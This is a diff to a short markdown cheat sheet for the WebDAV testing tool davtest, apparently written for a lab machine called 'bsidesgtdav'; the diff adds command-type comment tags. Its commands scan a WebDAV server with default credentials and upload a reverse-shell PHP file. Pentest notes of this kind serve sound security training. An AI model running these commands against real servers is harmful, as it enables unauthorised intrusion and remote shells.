@@ -8,12 +8,14 @@ Used on: **bsidesgtdav**
 
 Scan a WebDAV server using basic authentication to test for file uploads and execution:
 
+<!-- cmd: linux -->
 ```bash
 davtest -url http://10.130.148.83/webdav/ -auth wampp:xampp
 ```
 
 Upload a specific reverse shell payload:
 
+<!-- cmd: linux -->
 ```bash
 davtest -url http://10.130.148.83/webdav/ -auth wampp:xampp -uploadfile reverse.php -uploadloc reverse.php
 ```
